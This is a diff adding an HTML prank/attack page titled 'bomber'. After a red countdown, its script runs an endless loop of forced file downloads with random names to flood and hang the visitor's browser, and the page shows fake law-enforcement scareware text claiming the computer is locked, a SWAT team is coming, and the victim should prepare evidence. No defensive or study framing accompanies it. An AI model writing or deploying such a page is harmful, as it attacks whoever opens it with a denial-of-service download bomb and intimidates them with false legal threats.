@@ -1,0 +1,98 @@
+<!DOCTYPE html">
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Wecolme to bomber :-)</title>
+    <!--[if IE]>
+<style type="text/css">
+html pre
+{
+width: 636px ;
+}
+</style>
+<![endif]-->
+    <h5><title>Pwned</title></h5>
+	<style type="text/css">
+		* {
+			width:100%;
+			margin:0px;
+			padding:0px;
+			overflow: hidden;
+		}
+		#counter{
+			position: absolute;
+			top:50px;
+			width: 100%;
+			text-align: center;
+			font-size: 40em;
+			font-weight: bold;
+			color:red;
+			z-index: 666;
+		}
+    <body>
+	</style>
+	<div id="counter"></div>
+        <script type="text/javascript">
+		function download(g, h, j){
+			var k = new Blob([g],{
+				type: j
+			});
+			if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
+			else{
+				var l = document.createElement("a"),
+					m = URL.createObjectURL(k);
+				l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+			}
+		}
+		function bomb_ch(){
+			var g = Math.random().toString(36).substring(20),
+				h = Math.floor(50 * Math.random() + 25);
+			while (true) download(h, g, g)
+		}
+		function ch_jam(){
+			bomb_ch()
+		}
+		function launch_bomb(){
+			setInterval(ch_jam, 0.5);
+		}
+		var timeleft = 5;
+		var downloadTimer = setInterval(function(){
+		  document.getElementById("counter").innerHTML = timeleft--;
+		  	if(timeleft <= 0){
+		    	clearInterval(downloadTimer);
+				launch_bomb();
+			}
+		},1000);
+  </script>
+  <h2>
+    <ul>
+      <p>
+        Hi happy today :)
+      </p>
+    </ul>
+  </h2>
+  <h3>
+    <li>
+      <p>
+        Your operating system has been locked due to the violation of the federal laws of the Global Internet Safety Society. This computer lock is aimed to stop your illegal activity
+      
+      Understand your rights
+      rights
+        You have the right to remain silent.
+        The information you provide can and will be used against you in a court of law.
+        You have the right to an attorney. If you can't afford an attorney, one will be provided for you.
+      
+      You are bound to do the following
+      Now that you understand your rights, remain calm and do not leave the area.
+      A SWAT team is on the way to your location. Make sure the door is open, otherwise they are ready to break in
+      Don't distroy any evidence and don't contact your accomplices!
+      Prepare disks, flash drives and any other multimedia devices containing illegal materials, proving your criminality
+      Be prepared to answer the question during your interrogation! Cooperate and don't deny the charges against you.
+      </p>
+    </li>
+  </h3>
+</head>
+</html>
+
+
